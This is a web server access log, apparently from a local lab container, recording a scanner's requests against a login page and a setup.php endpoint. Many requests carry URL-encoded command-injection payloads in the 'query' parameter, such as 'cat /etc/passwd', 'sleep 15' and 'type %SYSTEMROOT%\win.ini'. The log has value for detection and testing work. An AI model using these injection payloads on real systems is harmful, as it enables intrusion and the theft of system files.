172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /setup.php?query=query%26cat+%2Fetc%2Fpasswd%26 HTTP/1.1" 200 7478 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /setup.php?query=query%3Bcat+%2Fetc%2Fpasswd%3B HTTP/1.1" 200 4528 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /setup.php?query=query%22%26cat+%2Fetc%2Fpasswd%26%22 HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /setup.php?query=query%22%3Bcat+%2Fetc%2Fpasswd%3B%22 HTTP/1.1" 200 4478 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /setup.php?query=query%27%26cat+%2Fetc%2Fpasswd%26%27 HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /setup.php?query=query%27%3Bcat+%2Fetc%2Fpasswd%3B%27 HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /setup.php?query=query%26sleep+15%26 HTTP/1.1" 200 4478 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /setup.php?query=query%3Bsleep+15%3B HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /setup.php?query=query%22%26sleep+15%26%22 HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /setup.php?query=query%22%3Bsleep+15%3B%22 HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /setup.php?query=query%26sleep+%7B0%7D%26 HTTP/1.1" 200 4478 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /setup.php?query=query%3Bsleep+%7B0%7D%3B HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /setup.php?query=query%26type+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /setup.php?query=query%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /setup.php?query=query%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22 HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /setup.php?query=query%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /setup.php?query=query%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27 HTTP/1.1" 200 4478 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /setup.php?query=query%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /setup.php?query=query%26timeout+%2FT+15 HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /setup.php?query=query%7Ctimeout+%2FT+15 HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /setup.php?query=query%22%26timeout+%2FT+15%26%22 HTTP/1.1" 200 4478 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /setup.php?query=query%22%7Ctimeout+%2FT+15 HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /setup.php?query=query%26timeout+%2FT+%7B0%7D%26 HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /setup.php?query=query%7Ctimeout+%2FT+%7B0%7D HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /setup.php?query=query%3Bget-help HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /setup.php?query=query%22%3Bget-help HTTP/1.1" 200 4478 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 300 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /setup.php?query=query%27%3Bget-help HTTP/1.1" 200 4478 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /setup.php?query=query%3Bget-help+%23 HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /setup.php?query=query%3Bstart-sleep+-s+15 HTTP/1.1" 200 4478 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /setup.php?query=query%22%3Bstart-sleep+-s+15 HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /setup.php?query=query%3Bstart-sleep+-s+%7B0%7D HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /setup.php?query=query%3Bstart-sleep+-s+15+%23 HTTP/1.1" 200 4428 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php?query=query%26cat+%2Fetc%2Fpasswd%26 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php?query=query%3Bcat+%2Fetc%2Fpasswd%3B HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php?query=query%22%26cat+%2Fetc%2Fpasswd%26%22 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php?query=query%22%3Bcat+%2Fetc%2Fpasswd%3B%22 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php?query=query%27%26cat+%2Fetc%2Fpasswd%26%27 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php?query=query%27%3Bcat+%2Fetc%2Fpasswd%3B%27 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php?query=query%26sleep+15%26 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php?query=query%3Bsleep+15%3B HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php?query=query%22%26sleep+15%26%22 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php?query=query%22%3Bsleep+15%3B%22 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php?query=query%26sleep+%7B0%7D%26 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
